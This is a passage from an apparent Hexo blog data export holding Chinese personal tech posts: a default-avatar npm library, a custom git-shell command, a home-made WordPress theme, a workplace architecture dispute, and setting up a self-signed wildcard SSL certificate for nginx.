namedavatar.config(&#123;</span><br><span class=\"line\">    nameType: &apos;lastName&apos;,</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  // set multi &lt;img&gt; use data-name attribute for full name</span><br><span class=\"line\">  namedavatar.setImgs(document.querySelectorAll(&apos;img[alt]&apos;), &apos;alt&apos;)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<p>相比其它类似项目，首先对中文的支持更好。其次是直接在<code>&lt;img&gt;</code>标签上填充data URI，绿色无添加，应用成本更低。而且基于<code>&lt;svg&gt;</code>，没有用<code>&lt;canvas&gt;</code>渲染，性能也会好一点。</p>\n<h2 id=\"还支持Vue-js的-directive-指令方式调用：\"><a href=\"#还支持Vue-js的-directive-指令方式调用：\" class=\"headerlink\" title=\"还支持Vue.js的 directive 指令方式调用：\"></a>还支持Vue.js的 directive 指令方式调用：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; directive &#125; from &apos;namedavatar/vue&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">// register as directive</span><br><span class=\"line\">Vue.directive(&apos;avatar&apos;, directive);</span><br><span class=\"line\"></span><br><span class=\"line\">// in vue template</span><br><span class=\"line\">&lt;template&gt;</span><br><span class=\"line\">&lt;img v-avatar=&quot;&apos;Tom Hanks&apos;&quot; width=&quot;36&quot;/&gt;</span><br><span class=\"line\">&lt;/template&gt;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>写了一个填充缺省头像的npm库：<a href=\"https://github.com/joaner/namedavatar\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner/namedavatar</a></p>\n<p>在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。</p>\n<p><img src=\"https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png\" alt=\"\"></p>\n<p>如果上传头像不存在，直接会在 <code>&lt;img&gt;</code> 标签上填充默认头像：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img alt=&quot;李连杰&quot; width=&quot;32&quot;&gt;</span><br><span class=\"line\">&lt;img src=&quot;./invalid.jpg&quot; alt=&quot;Tom Hanks&quot; width=&quot;40&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">requirejs(&apos;namedavatar&apos;, function(namedavatar)&#123;</span><br><span class=\"line\">  namedavatar.config(&#123;</span><br><span class=\"line\">    nameType: &apos;lastName&apos;,</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  // set multi &lt;img&gt; use data-name attribute for full name</span><br><span class=\"line\">  namedavatar.setImgs(document.querySelectorAll(&apos;img[alt]&apos;), &apos;alt&apos;)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<p>相比其它类似项目，首先对中文的支持更好。其次是直接在<code>&lt;img&gt;</code>标签上填充data URI，绿色无添加，应用成本更低。而且基于<code>&lt;svg&gt;</code>，没有用<code>&lt;canvas&gt;</code>渲染，性能也会好一点。</p>\n<h2 id=\"还支持Vue-js的-directive-指令方式调用：\"><a href=\"#还支持Vue-js的-directive-指令方式调用：\" class=\"headerlink\" title=\"还支持Vue.js的 directive 指令方式调用：\"></a>还支持Vue.js的 directive 指令方式调用：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; directive &#125; from &apos;namedavatar/vue&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">// register as directive</span><br><span class=\"line\">Vue.directive(&apos;avatar&apos;, directive);</span><br><span class=\"line\"></span><br><span class=\"line\">// in vue template</span><br><span class=\"line\">&lt;template&gt;</span><br><span class=\"line\">&lt;img v-avatar=&quot;&apos;Tom Hanks&apos;&quot; width=&quot;36&quot;/&gt;</span><br><span class=\"line\">&lt;/template&gt;</span><br></pre></td></tr></table></figure>\n"},{"title":"自定义git-shell命令","id":"141","date":"2015-07-22T15:57:59.000Z","_content":"\n之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: **[搭建自己的git服务器](https://xiaoai.me/?p=70 \"编辑“搭建自己的git服务器”\") **https://xiaoai.me/?p=70\n\n默认的，git-shell只提供了**list**命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：\n\n## 创建命令\n\n只需要在git-shell目录下增加一个可执行文件，比如就叫 **create**\n```\n$ cd /home/git\n$ sudo vi git-shell-commands/create\n#/bin/sh\ngit init --bare $1.git;\n$ sudo chmod a+x git-shell-commands/create\n\n```\n这里的**/home/git**就是git用户的主目录，也就是存放所有仓库的目录．**git-shell-commands/create **就是创建新仓库的脚本，它的参数 **$1 **就是传入的新仓库名\n\n## 调用命令\n\n```\n$ ssh git@xiaoai.me\nRun 'help' for help, or 'exit' to leave.  Available commands:\ncreate\nlist\ngit> create hello\nInitialized empty Git repository in /home/git/hello.git/\n\n```\n至此就算扩展了一个新功能，挺简单的","source":"_posts/e8-87-aa-e5-ae-9a-e4-b9-89git-shell-e5-91-bd-e4-bb-a4.md","raw":"---\ntitle: 自定义git-shell命令\nid: 141\ncategories:\n  - linux\ndate: 2015-07-22 23:57:59\ntags:\n---\n\n之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: **[搭建自己的git服务器](https://xiaoai.me/?p=70 \"编辑“搭建自己的git服务器”\") **https://xiaoai.me/?p=70\n\n默认的，git-shell只提供了**list**命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：\n\n## 创建命令\n\n只需要在git-shell目录下增加一个可执行文件，比如就叫 **create**\n```\n$ cd /home/git\n$ sudo vi git-shell-commands/create\n#/bin/sh\ngit init --bare $1.git;\n$ sudo chmod a+x git-shell-commands/create\n\n```\n这里的**/home/git**就是git用户的主目录，也就是存放所有仓库的目录．**git-shell-commands/create **就是创建新仓库的脚本，它的参数 **$1 **就是传入的新仓库名\n\n## 调用命令\n\n```\n$ ssh git@xiaoai.me\nRun 'help' for help, or 'exit' to leave.  Available commands:\ncreate\nlist\ngit> create hello\nInitialized empty Git repository in /home/git/hello.git/\n\n```\n至此就算扩展了一个新功能，挺简单的","slug":"e8-87-aa-e5-ae-9a-e4-b9-89git-shell-e5-91-bd-e4-bb-a4","published":1,"updated":"2018-03-05T12:57:36.655Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvo001jlzlmmmvnugr3","content":"<p>之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: <strong><a href=\"https://xiaoai.me/?p=70\" title=\"编辑“搭建自己的git服务器”\">搭建自己的git服务器</a> </strong><a href=\"https://xiaoai.me/?p=70\">https://xiaoai.me/?p=70</a></p>\n<p>默认的，git-shell只提供了<strong>list</strong>命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：</p>\n<h2 id=\"创建命令\"><a href=\"#创建命令\" class=\"headerlink\" title=\"创建命令\"></a>创建命令</h2><p>只需要在git-shell目录下增加一个可执行文件，比如就叫 <strong>create</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd /home/git</span><br><span class=\"line\">$ sudo vi git-shell-commands/create</span><br><span class=\"line\">#/bin/sh</span><br><span class=\"line\">git init --bare $1.git;</span><br><span class=\"line\">$ sudo chmod a+x git-shell-commands/create</span><br></pre></td></tr></table></figure></p>\n<p>这里的<strong>/home/git</strong>就是git用户的主目录，也就是存放所有仓库的目录．<strong>git-shell-commands/create </strong>就是创建新仓库的脚本，它的参数 <strong>$1 </strong>就是传入的新仓库名</p>\n<h2 id=\"调用命令\"><a href=\"#调用命令\" class=\"headerlink\" title=\"调用命令\"></a>调用命令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh git@xiaoai.me</span><br><span class=\"line\">Run &apos;help&apos; for help, or &apos;exit&apos; to leave.  Available commands:</span><br><span class=\"line\">create</span><br><span class=\"line\">list</span><br><span class=\"line\">git&gt; create hello</span><br><span class=\"line\">Initialized empty Git repository in /home/git/hello.git/</span><br></pre></td></tr></table></figure>\n<p>至此就算扩展了一个新功能，挺简单的</p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: <strong><a href=\"https://xiaoai.me/?p=70\" title=\"编辑“搭建自己的git服务器”\">搭建自己的git服务器</a> </strong><a href=\"https://xiaoai.me/?p=70\">https://xiaoai.me/?p=70</a></p>\n<p>默认的，git-shell只提供了<strong>list</strong>命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：</p>\n<h2 id=\"创建命令\"><a href=\"#创建命令\" class=\"headerlink\" title=\"创建命令\"></a>创建命令</h2><p>只需要在git-shell目录下增加一个可执行文件，比如就叫 <strong>create</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd /home/git</span><br><span class=\"line\">$ sudo vi git-shell-commands/create</span><br><span class=\"line\">#/bin/sh</span><br><span class=\"line\">git init --bare $1.git;</span><br><span class=\"line\">$ sudo chmod a+x git-shell-commands/create</span><br></pre></td></tr></table></figure></p>\n<p>这里的<strong>/home/git</strong>就是git用户的主目录，也就是存放所有仓库的目录．<strong>git-shell-commands/create </strong>就是创建新仓库的脚本，它的参数 <strong>$1 </strong>就是传入的新仓库名</p>\n<h2 id=\"调用命令\"><a href=\"#调用命令\" class=\"headerlink\" title=\"调用命令\"></a>调用命令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh git@xiaoai.me</span><br><span class=\"line\">Run &apos;help&apos; for help, or &apos;exit&apos; to leave.  Available commands:</span><br><span class=\"line\">create</span><br><span class=\"line\">list</span><br><span class=\"line\">git&gt; create hello</span><br><span class=\"line\">Initialized empty Git repository in /home/git/hello.git/</span><br></pre></td></tr></table></figure>\n<p>至此就算扩展了一个新功能，挺简单的</p>\n"},{"title":"自己做了个WP主题","id":"291","date":"2016-02-07T13:15:55.000Z","_content":"\n之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：\n1\\. 页面简洁，一切都应围绕阅读\n2\\. 资源小巧，初次加载应该控制在50K，不能用jQuery\n3\\. 每篇文章，有标题摘要导航，类同segmentfault\n\n所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。\n\n当前只是基本的显示，像WP的工具栏还没有做好。\n\n接下来还会迭代：\n1\\. 文章标题摘要导航\n2\\. 补充工具栏的样式\n3\\. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。\n4\\. 重构模版，现在列表和详情都混合在一起。\n\n等迭代的差不多了，我想把它发布到wp themes上。","source":"_posts/e8-87-aa-e5-b7-b1-e5-81-9a-e4-ba-86-e4-b8-aawp-e4-b8-bb-e9-a2-98.md","raw":"---\ntitle: 自己做了个WP主题\nid: 291\ncategories:\n  - 前端\ndate: 2016-02-07 21:15:55\ntags:\n---\n\n之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：\n1\\. 页面简洁，一切都应围绕阅读\n2\\. 资源小巧，初次加载应该控制在50K，不能用jQuery\n3\\. 每篇文章，有标题摘要导航，类同segmentfault\n\n所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。\n\n当前只是基本的显示，像WP的工具栏还没有做好。\n\n接下来还会迭代：\n1\\. 文章标题摘要导航\n2\\. 补充工具栏的样式\n3\\. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。\n4\\. 重构模版，现在列表和详情都混合在一起。\n\n等迭代的差不多了，我想把它发布到wp themes上。","slug":"e8-87-aa-e5-b7-b1-e5-81-9a-e4-ba-86-e4-b8-aawp-e4-b8-bb-e9-a2-98","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvq001mlzlmpr8fvzcz","content":"<p>之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：<br>1. 页面简洁，一切都应围绕阅读<br>2. 资源小巧，初次加载应该控制在50K，不能用jQuery<br>3. 每篇文章，有标题摘要导航，类同segmentfault</p>\n<p>所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。</p>\n<p>当前只是基本的显示，像WP的工具栏还没有做好。</p>\n<p>接下来还会迭代：<br>1. 文章标题摘要导航<br>2. 补充工具栏的样式<br>3. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。<br>4. 重构模版，现在列表和详情都混合在一起。</p>\n<p>等迭代的差不多了，我想把它发布到wp themes上。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：<br>1. 页面简洁，一切都应围绕阅读<br>2. 资源小巧，初次加载应该控制在50K，不能用jQuery<br>3. 每篇文章，有标题摘要导航，类同segmentfault</p>\n<p>所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。</p>\n<p>当前只是基本的显示，像WP的工具栏还没有做好。</p>\n<p>接下来还会迭代：<br>1. 文章标题摘要导航<br>2. 补充工具栏的样式<br>3. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。<br>4. 重构模版，现在列表和详情都混合在一起。</p>\n<p>等迭代的差不多了，我想把它发布到wp themes上。</p>\n"},{"title":"自己重要还是公司重要","id":"192","date":"2015-11-07T15:50:25.000Z","_content":"\n前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。\n\n我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。\n\n老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。\n\n当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。","source":"_posts/e8-87-aa-e5-b7-b1-e9-87-8d-e8-a6-81-e8-bf-98-e6-98-af-e5-85-ac-e5-8f-b8-e9-87-8d-e8-a6-81.md","raw":"---\ntitle: 自己重要还是公司重要\nid: 192\ncategories:\n  - 经历\ndate: 2015-11-07 23:50:25\ntags:\n---\n\n前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。\n\n我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。\n\n老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。\n\n当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。","slug":"e8-87-aa-e5-b7-b1-e9-87-8d-e8-a6-81-e8-bf-98-e6-98-af-e5-85-ac-e5-8f-b8-e9-87-8d-e8-a6-81","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvs001olzlmel0f2oof","content":"<p>前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。</p>\n<p>我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。</p>\n<p>老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。</p>\n<p>当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。</p>\n<p>我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。</p>\n<p>老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。</p>\n<p>当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。</p>\n"},{"title":"自签名通配符SSL证书","id":"82","date":"2015-06-14T14:51:30.000Z","_content":"\n通配符的证书 ***.example.com** 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．\n\n## 创建证书\n\n创建根证书私匙，这里的2048也可以是4096更安全\n```\nopenssl genrsa -out root.key 2048\n```\n创建根证书公钥\n```\nopenssl req -new -key root.key -out root.csr\n```\n创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:*.xiaoai.me**,DNS:*.site2.com**\n```\necho \"subjectAltName=DNS:*.xiaoai.me\" > cert_extensions\n```\n创建web服务器使用的CA证书\n```\nopenssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095\n```\n这里会询问一些参数，比如签发者的组织名，可以随便填都行\n\n#### 参数作用\n\n**-sha512 **加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃\n\n**-days 1095  **证书有效期3年\n\n**-extfile cert_extensions **包含刚才创建的通配符配置\n\n**-out server.crt** 创建服务器使用的CA证书\n\n## 配置证书\n\n#### nginx 主机\n\n```\nlisten 443 ssl;\nserver_name ssl1.xiaoai.me;\n\n```\n\n#### 证书配置\n\n```\nssl_certificate server.crt;\nssl_certificate_key root.key;\n\n```\n\n#### 缓存优化\n\n```\nssl_session_cache shared:SSL:10m;\nssl_session_timeout 10m;\n```\n\n## 信任证书\n\n现在访问 https://ssl1.xiaoai.me 会提示证书错误，需要将证书安装在系统信任根证书列表里．\n\n#### 导出网站证书\n\n从浏览器的查看证书选项里，导出证书．一般为 **.cer 格式 **文件\n\n#### 导入到根证书列表里\n\n在开始菜单中运行 **certmgr.msc** 打开证书管理器，在 **受信任的根证书颁发机构 **，右键选择导入刚才的**.cer**格式文件，最终确定信任即可．\n\n最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了","source":"_posts/e8-87-aa-e7-ad-be-e5-90-8d-e9-80-9a-e9-85-8d-e7-ac-a6ssl-e8-af-81-e4-b9-a6.md","raw":"---\ntitle: 自签名通配符SSL证书\nid: 82\ncategories:\n  - linux\ndate: 2015-06-14 22:51:30\ntags:\n---\n\n通配符的证书 ***.example.com** 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．\n\n## 创建证书\n\n创建根证书私匙，这里的2048也可以是4096更安全\n```\nopenssl genrsa -out root.key 2048\n```\n创建根证书公钥\n```\nopenssl req -new -key root.key -out root.csr\n```\n创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:*.xiaoai.me**,DNS:*.site2.com**\n```\necho \"subjectAltName=DNS:*.xiaoai.me\" > cert_extensions\n```\n创建web服务器使用的CA证书\n```\nopenssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095\n```\n这里会询问一些参数，比如签发者的组织名，可以随便填都行\n\n#### 参数作用\n\n**-sha512 **加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃\n\n**-days 1095  **证书有效期3年\n\n**-extfile cert_extensions **包含刚才创建的通配符配置\n\n**-out server.crt** 创建服务器使用的CA证书\n\n## 配置证书\n\n#### nginx 主机\n\n```\nlisten 443 ssl;\nserver_name ssl1.xiaoai.me;\n\n```\n\n#### 证书配置\n\n```\nssl_certificate server.crt;\nssl_certificate_key root.key;\n\n```\n\n#### 缓存优化\n\n```\nssl_session_cache shared:SSL:10m;\nssl_session_timeout 10m;\n```\n\n## 信任证书\n\n现在访问 https://ssl1.xiaoai.me 会提示证书错误，需要将证书安装在系统信任根证书列表里．\n\n#### 导出网站证书\n\n从浏览器的查看证书选项里，导出证书．一般为 **.cer 格式 **文件\n\n#### 导入到根证书列表里\n\n在开始菜单中运行 **certmgr.msc** 打开证书管理器，在 **受信任的根证书颁发机构 **，右键选择导入刚才的**.cer**格式文件，最终确定信任即可．\n\n最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了","slug":"e8-87-aa-e7-ad-be-e5-90-8d-e9-80-9a-e9-85-8d-e7-ac-a6ssl-e8-af-81-e4-b9-a6","published":1,"updated":"2018-03-05T12:57:36.655Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvu001rlzlmsz2tay3t","content":"<p>通配符的证书 <strong>*.example.com</strong> 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．</p>\n<h2 id=\"创建证书\"><a href=\"#创建证书\" class=\"headerlink\" title=\"创建证书\"></a>创建证书</h2><p>创建根证书私匙，这里的2048也可以是4096更安全<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl genrsa -out root.key 2048</span><br></pre></td></tr></table></figure></p>\n<p>创建根证书公钥<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -new -key root.key -out root.csr</span><br></pre></td></tr></table></figure></p>\n<p>创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:<em>.xiaoai.me**,DNS:</em>.site2.com**<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;subjectAltName=DNS:*.xiaoai.me&quot; &gt; cert_extensions</span><br></pre></td></tr></table></figure></p>\n<p>创建web服务器使用的CA证书<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095</span><br></pre></td></tr></table></figure></p>\n<p>这里会询问一些参数，比如签发者的组织名，可以随便填都行</p>\n<h4 id=\"参数作用\"><a href=\"#参数作用\" class=\"headerlink\" title=\"参数作用\"></a>参数作用</h4><p><strong>-sha512 </strong>加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃</p>\n<p><strong>-days 1095  </strong>证书有效期3年</p>\n<p><strong>-extfile cert_extensions </strong>包含刚才创建的通配符配置</p>\n<p><strong>-out server.crt</strong> 创建服务器使用的CA证书</p>\n<h2 id=\"配置证书\"><a href=\"#配置证书\" class=\"headerlink\" title=\"配置证书\"></a>配置证书</h2><h4 id=\"nginx-主机\"><a href=\"#nginx-主机\" class=\"headerlink\" title=\"nginx 主机\"></a>nginx 主机</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listen 443 ssl;</span><br><span class=\"line\">server_name ssl1.xiaoai.me;</span><br></pre></td></tr></table></figure>\n<h4 id=\"证书配置\"><a href=\"#证书配置\" class=\"headerlink\" title=\"证书配置\"></a>证书配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssl_certificate server.crt;</span><br><span class=\"line\">ssl_certificate_key root.key;</span><br></pre></td></tr></table></figure>\n<h4 id=\"缓存优化\"><a href=\"#缓存优化\" class=\"headerlink\" title=\"缓存优化\"></a>缓存优化</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssl_session_cache shared:SSL:10m;</span><br><span class=\"line\">ssl_session_timeout 10m;</span><br></pre></td></tr></table></figure>\n<h2 id=\"信任证书\"><a href=\"#信任证书\" class=\"headerlink\" title=\"信任证书\"></a>信任证书</h2><p>现在访问 <a href=\"https://ssl1.xiaoai.me\" target=\"_blank\" rel=\"noopener\">https://ssl1.xiaoai.me</a> 会提示证书错误，需要将证书安装在系统信任根证书列表里．</p>\n<h4 id=\"导出网站证书\"><a href=\"#导出网站证书\" class=\"headerlink\" title=\"导出网站证书\"></a>导出网站证书</h4><p>从浏览器的查看证书选项里，导出证书．一般为 <strong>.cer 格式 </strong>文件</p>\n<h4 id=\"导入到根证书列表里\"><a href=\"#导入到根证书列表里\" class=\"headerlink\" title=\"导入到根证书列表里\"></a>导入到根证书列表里</h4><p>在开始菜单中运行 <strong>certmgr.msc</strong> 打开证书管理器，在 <strong>受信任的根证书颁发机构 </strong>，右键选择导入刚才的<strong>.cer</strong>格式文件，最终确定信任即可．</p>\n<p>最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>通配符的证书 <strong>*.example.com</strong> 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．</p>\n<h2 id=\"创建证书\"><a href=\"#创建证书\" class=\"headerlink\" title=\"创建证书\"></a>创建证书</h2><p>创建根证书私匙，这里的2048也可以是4096更安全<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl genrsa -out root.key 2048</span><br></pre></td></tr></table></figure></p>\n<p>创建根证书公钥<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -new -key root.key -out root.csr</span><br></pre></td></tr></table></figure></p>\n<p>创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:<em>.xiaoai.me**,DNS:</em>.site2.com**<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;subjectAltName=DNS:*.xiaoai.me&quot; &gt; cert_extensions</span><br></pre></td></tr></table></figure></p>\n<p>创建web服务器使用的CA证书<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095</span><br></pre></td></tr></table></figure></p>\n<p>这里会询问一些参数，比如签发者的组织名，可以随便填都行</p>\n<h4 id=\"参数作用\"><a href=\"#参数作用\" class=\"headerlink\" title=\"参数作用\"></a>参数作用</h4><p><strong>-sha512 </strong>加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃</p>\n<p><strong>-days 1095  </strong>证书有效期3年</p>\n<p><strong>-extfile cert_extensions </strong>包含刚才创建的通配符配置</p>\n<p><strong>-out server.crt</strong> 创建服务器使用的CA证书</p>\n<h2 id=\"配置证书\"><a href=\"#配置证书\" class=\"headerlink\" title=\"配置证书\"></a>配置证书</h2><h4 id=\"nginx-主机\"><a href=\"#nginx-主机\" class=\"headerlink\" title=\"nginx 主机\"></a>nginx 主机</h4><figure class=\"highlight plain\"><table><tr><td 